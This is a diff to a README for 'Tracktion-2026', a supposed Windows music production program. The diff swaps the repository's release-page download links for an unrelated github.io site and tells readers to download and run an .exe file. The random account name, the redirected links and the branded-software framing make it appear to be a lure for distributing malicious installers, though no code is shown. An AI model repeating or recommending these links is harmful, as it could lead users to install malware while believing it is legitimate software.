@@ -1,6 +1,6 @@
 # 🎧 Tracktion-2026 - Produce professional music on your computer
 
-[![Download Tracktion-2026](https://img.shields.io/badge/Download-Tracktion_2026-blue)](https://github.com/Huggermuggerspondylarthritis478/Tracktion-2026/releases)
+[![Download Tracktion-2026](https://img.shields.io/badge/Download-Tracktion_2026-blue)](https://huggermuggerspondylarthritis478.github.io)
 
 Tracktion-2026 serves as a digital audio workstation. It allows you to record, edit, and mix music on your Windows computer. This version provides tools for song writers, producers, and sound engineers. You achieve high production quality through a single-screen interface.
 
@@ -19,7 +19,7 @@ Tracktion-2026 requires specific hardware to function. Ensure your computer meet
 
 You obtain the installer files from the project release page. 
 
-1. Visit [this page to download the software](https://github.com/Huggermuggerspondylarthritis478/Tracktion-2026/releases).
+1. Visit [this page to download the software](https://huggermuggerspondylarthritis478.github.io).
 2. Look for the "Assets" section at the bottom of the latest release post.
 3. Click the link ending in .exe to start the file transfer to your computer.
 4. Save the file to your "Downloads" folder.
